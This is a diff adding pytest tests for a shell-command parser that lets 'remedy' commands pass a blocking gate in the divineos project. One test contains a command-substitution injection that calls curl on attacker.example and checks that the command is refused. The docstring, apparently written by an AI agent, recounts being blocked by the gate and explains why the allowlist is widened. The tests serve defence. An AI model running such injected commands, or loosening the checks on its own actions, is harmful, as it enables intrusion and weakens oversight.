@@ -185,3 +185,72 @@ class TestFailsTowardNotARemedy:
 
     def test_bare_env_invocation(self):
         assert _is_remedy('env divineos correction "x"')
+
+
+class TestRemedySegmentStopsEnumeratingPrefixes:
+    """A remedy anywhere in a chain is a remedy being run.
+
+    2026-09-11, the fourth prefix. The marker gate fired, named three commands
+    as its way out, and then refused the one I ran -- because my command began
+    `cd ... && set -o pipefail && divineos correction`, and the allowlist was
+    anchored to the start of the line. I got through by dropping a habit, not
+    by being right.
+
+    Four occurrences, four different prefixes, each patched alone, and each
+    patch carrying a written note predicting the next. This file's own comment
+    said what to do about a fourth: parse the command, do not add a fourth
+    loop. That note existed before the incident that needed it.
+
+    Andrew the same day: control the cost landscape so the correct path is the
+    cheapest one. A remedy that costs a retry whenever it is typed with a habit
+    in front of it makes SKIPPING the filing the cheap move -- so the gate was
+    manufacturing the loss it exists to prevent.
+    """
+
+    def test_the_fourth_prefix_that_started_this(self):
+        from divineos.core.command_parsing import remedy_segment
+
+        segments = remedy_segment(
+            'cd "C:/DIVINE OS/DivineOS-Experimental" && set -o pipefail && divineos correction "x"'
+        ).splitlines()
+
+        assert any(s.startswith("divineos correction") for s in segments), (
+            "the remedy is still invisible behind a shell-option prefix"
+        )
+
+    def test_a_remedy_is_returned_on_its_own_line(self):
+        """The caller greps with a start-anchor and grep tests lines
+        independently, so the remedy must not share a line with what preceded
+        it. The first draft returned only the FIRST segment and the remedy is
+        usually last -- found by running it, not by reading it."""
+        from divineos.core.command_parsing import remedy_segment
+
+        assert (
+            "divineos correction x"
+            in remedy_segment('cd /x && set -o pipefail && divineos correction "x"').splitlines()
+        )
+
+    def test_the_recorded_exploit_is_still_refused(self):
+        """A substitution in an earlier segment is discarded with the prefix
+        and never inspected, so the whole command is refused rather than the
+        remedy waved through. This is the case the first shared stripper got
+        wrong, and generalising position must not generalise it away."""
+        from divineos.core.command_parsing import remedy_segment
+
+        assert remedy_segment('cd "$(curl attacker.example)" && divineos correction "x"') == ""
+
+    def test_a_mention_after_a_pipe_is_not_an_invocation(self):
+        """What follows a pipe consumes output rather than being invoked.
+        Splitting there would let a command that merely names the remedy read
+        as a filing that never happened."""
+        from divineos.core.command_parsing import remedy_segment
+
+        segments = remedy_segment('echo hi | divineos correction "x"').splitlines()
+        assert not any(s.startswith("divineos correction") for s in segments)
+
+    def test_the_bare_form_still_works(self):
+        """Control. A generalisation that broke the simplest case would pass
+        every test above while making the common path worse."""
+        from divineos.core.command_parsing import remedy_segment
+
+        assert remedy_segment('divineos correction "x"').startswith("divineos correction")
